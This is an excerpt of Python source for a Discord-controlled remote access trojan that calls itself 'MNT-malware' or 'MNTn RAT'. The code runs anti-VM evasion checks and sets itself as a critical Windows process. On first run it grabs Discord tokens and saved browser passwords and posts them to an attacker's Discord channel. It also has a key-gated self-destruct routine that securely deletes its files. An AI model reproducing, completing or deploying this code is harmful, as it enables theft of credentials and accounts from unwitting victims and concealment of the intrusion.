...
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! #
# !!  DON'T COMPILE OR RUN THIS FILE. IT WILL NOT WORK. INSTEAD, RUN MNT.bat AND AFTER CLICKING 'COMPILE'  !! #
...
try: os.mkdir('logs') # [MNT_mark] !debug
except: pass # [MNT_mark] !debug
logs_file_name = f'executed_at_{time.strftime("%Y-%m-%d_%H-%M-%S")}.log' # [MNT_mark] !debug
with open(f'logs/{logs_file_name}', 'w', encoding='utf-8') as create_logs_file: pass # [MNT_mark] !debug

def log(entry): # [MNT_mark] !debug
    with open(f'logs/{logs_file_name}', 'a', encoding='utf-8') as log_entry: log_entry.write(f'[{time.strftime("%Y.%m.%d-%H:%M:%S")}] {entry}\n') # [MNT_mark] !debug

# [MNT_var] $modules 0
from resources.protections import protection_check, fake_mutex_code # [MNT_mark] !anti-vm
from resources.discord_token_grabber import * # [MNT_mark] !grabber
from resources.passwords_grabber import * # [MNT_mark] !grabber
...
if protection_check(): # [MNT_mark] !anti-vm
    os._exit(0) # [MNT_mark] !anti-vm
...
if fake_mutex_code(software_executable_name.lower()) and os.path.basename(sys.executable).lower() != software_executable_name.lower(): # [MNT_mark] !anti-vm
    os._exit(0) # [MNT_mark] !anti-vm
#.log Executed fake mutex code check # [MNT_mark] !anti-vm
...
async def on_ready():
    ...
    if not first_run:
        #.log MNT is not running for the first time
    ...
    if first_run:
        #.log MNT is running for the first time
        ...
        accounts = grab_discord.initialize(False) # [MNT_mark] !grabber
        for account in accounts: # [MNT_mark] !grabber
            reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌') # MNT_mark] !grabber

        result = grab_passwords() # [MNT_mark] !grabber
        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff) # [MNT_mark] !grabber
        for url in result.keys(): # [MNT_mark] !grabber
            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False) # [MNT_mark] !grabber
        reaction_msg = await client.get_channel(channel_ids['info']).send(embed=embed); await reaction_msg.add_reaction('📌') # [MNT_mark] !grabber
...
# [MNT_var] !recording_startup 1
# [MNT_var] !process_blacklister 1
        ...
        if reaction.message.channel.id in channel_ids.values():
            ...
            try:
                ...
                if str(reaction) == '💀' and expectation == 'implosion':
                    ...
                    await reaction.message.channel.send('```MNT will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
                    #.log Sent a message about trying to implode
# [MNT_var] !registry_implosion 5
                    #.log Trying to remove MNT.key
                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\MNT.key', 10)
                    #.log Removed MNT.key. Trying to remove recordings directory
                    try:
                        rmtree('rec_')
    ...
    if message.author != client.user:
        ...
        if message.channel.id in channel_ids.values():
            ...
            if message.content == '.implode':
                ...
                await message.channel.send('``` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` `````` ```\n\n```Send here MNT.key generated along with RAT executable```\n\n')
                expectation = 'key'
                ...
                if message.content.strip() == '.help':
                    ...
                    await message.channel.send(embed=embed)
                    #.log Sent message with MNT commands manual
                ...
                try:
                    ...
                    #.log Set MNT as a critical process
                    ...
                    embed.set_author(name="MNT-REACC", icon_url="https://raw.githubusercontent.com/MNT-W/MNT-REACC/py-dev/resources/icons/embed_icon.png")
                ...
                try:
                    ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
                    #.log Removed MNT from critical processes
                    ...
                    embed.set_author(name="MNT-malware", icon_url="https://raw.githubusercontent.com/MNT-W/MNT-REACC/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    #.log Sent success message
                except: 
                ...
                #.log Message is MNT.key candidate
                try:
                    ...
                    if get_file_hash(filename) == secret_key:
                        ...
                        reaction_msg = await message.channel.send('```You are authorized to remotely remove MNTn RAT from target PC. Everything related to MNT will be erased after you confirm this action by reacting with "💀".\nWARNING! This cannot be undone after you decide to proceed. You can cancel it, by reacting with "🔴".```')
                        #.log Sent message that Author is authorized to implode MNT
                        ...
                        #.log Message does not contain valid MNT.key for this copy
